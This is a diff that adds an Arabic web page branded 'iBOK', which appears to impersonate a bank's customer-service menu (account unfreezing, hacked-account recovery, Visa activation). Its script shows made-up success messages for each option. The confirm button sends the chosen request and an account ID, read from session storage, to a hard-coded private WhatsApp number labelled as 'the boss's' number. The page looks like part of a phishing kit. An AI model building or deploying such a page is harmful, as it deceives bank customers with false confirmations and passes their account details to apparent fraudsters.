@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خيارات تفاعلية - iBOK</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    
+</head>
+<body>
+
+    <div class="header">
+        <h1>iBOK - اختر خدمتك</h1>
+    </div>
+
+    <div class="options-container">
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تسجيل بلاغ حول التحويل الخاطئ بنجاح.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">💸</span>
+            <span class="option-text">تحويل خاطئ</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تسجيل طلب تغيير الهاتف بنجاح.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">📱</span>
+            <span class="option-text">تغيير الهاتف</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تسجيل طلب رفع السقف بنجاح.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">📈</span>
+            <span class="option-text">رفع السقف</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تسجيل محاولة دخول بكلمة مرور خاطئة.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">🔒</span>
+            <span class="option-text">كلمة مرور خاطئة</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تفعيل خدمة العملات الأجنبية.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">💱</span>
+            <span class="option-text">خدمة العملات الأجنبية</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم فك الحظر والتجميد عن حسابك.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">✅</span>
+            <span class="option-text">فك حظر وتجميد</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تسجيل طلب استرداد الحساب المخترق.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">🛡️</span>
+            <span class="option-text">استرداد حساب مخترق</span>
+        </label>
+
+        <label class="option-item">
+            <input type="checkbox" data-action="تم تفعيل بطاقة فيزا الخاصة بك بنجاح.">
+            <span class="custom-checkbox"></span>
+            <span class="option-icon">💳</span>
+            <span class="option-text">تفعيل فيزا</span>
+        </label>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <a href="#" class="whatsapp-fixed" id="whatsappBtn">
+        <span>💬</span> تأكيد الطلب
+    </a>
+
+<script type="module">
+    const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+    const toast = document.getElementById('toast');
+    let selectedRequest = null;
+
+    checkboxes.forEach(ch => {
+        ch.addEventListener('change', function () {
+            if(this.checked){
+                selectedRequest = this.getAttribute('data-action');
+                toast.innerText = selectedRequest;
+                toast.style.display = 'block';
+                setTimeout(()=> { toast.style.display = 'none'; }, 2500);
+            }
+        });
+    });
+
+    const whatsappBtn = document.getElementById('whatsappBtn');
+    whatsappBtn.addEventListener('click', () => {
+        if(!selectedRequest) {
+            alert('الرجاء اختيار خدمة أولاً');
+            return;
+        }
+        const userID = sessionStorage.getItem('userID') || '1234567';
+        const phoneNumber = '+249117614021'; // رقم واتساب الرئيس
+        const message = `مرحباً، أود تأكيد طلبي: ${selectedRequest}. رقم حسابي: ${userID}`;
+        const encodedMessage = encodeURIComponent(message);
+        window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
+    });
+</script>
+
+</body>
+</html>
